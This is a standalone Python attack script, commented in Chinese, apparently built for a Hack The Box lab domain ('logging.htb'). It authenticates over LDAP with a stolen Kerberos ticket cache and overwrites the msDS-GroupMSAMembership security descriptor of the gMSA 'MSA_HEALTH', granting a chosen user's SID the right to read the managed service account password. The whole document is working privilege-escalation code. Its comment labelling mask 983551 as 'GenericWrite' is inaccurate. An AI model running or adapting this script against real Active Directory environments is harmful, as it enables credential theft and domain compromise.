#!/usr/bin/env python3
import ldap3
from impacket.ldap import ldaptypes
import os

# LDAP 服务器地址
LDAP_SERVER = '10.129.14.88'
# gMSA 的 DN
GMSA_DN = 'CN=MSA_HEALTH,CN=Managed Service Accounts,DC=logging,DC=htb'
# 想要加入的用户 SID
USER_SID = 'S-1-5-21-4020823815-2796529489-1682170552-2111'  # wallace.everette

# 使用环境变量中的 Kerberos TGT
os.environ['KRB5CCNAME'] = '/root/Desktop/HTB/S10/Logging/svc_recovery.ccache'

# 建立 LDAP 连接，使用 Kerberos
server = ldap3.Server(LDAP_SERVER)
conn = ldap3.Connection(server,
                        authentication=ldap3.SASL,
                        sasl_mechanism=ldap3.KERBEROS,
                        auto_bind=True)

print("[*] LDAP bound:", conn.bound)

# 构建 ACL 数据，只替换 DACL 中的 SID
sd = ldaptypes.SR_SECURITY_DESCRIPTOR()
sd['Revision'] = b'\x01'
sd['Sbz1'] = b'\x00'
sd['Control'] = 32772
sd['OwnerSid'] = ldaptypes.LDAP_SID()
sd['OwnerSid'].fromCanonical('S-1-5-18')
sd['GroupSid'] = b''
sd['Sacl'] = b''

# 构建 ACE
acl = ldaptypes.ACL()
acl['AclRevision'] = 4
acl['Sbz1'] = 0
acl['Sbz2'] = 0

ace = ldaptypes.ACE()
ace['AceType'] = 0
ace['AceFlags'] = 0

nace = ldaptypes.ACCESS_ALLOWED_ACE()
nace['Mask'] = ldaptypes.ACCESS_MASK()
nace['Mask']['Mask'] = 983551  # GenericWrite 权限
nace['Sid'] = ldaptypes.LDAP_SID()
nace['Sid'].fromCanonical(USER_SID)

ace['Ace'] = nace
acl.aces = [ace]
sd['Dacl'] = acl

# 修改 gMSA 属性
success = conn.modify(GMSA_DN, {'msDS-GroupMSAMembership': [(ldap3.MODIFY_REPLACE, [sd.getData()])]})
print("[*] Modify result:", success, conn.result)
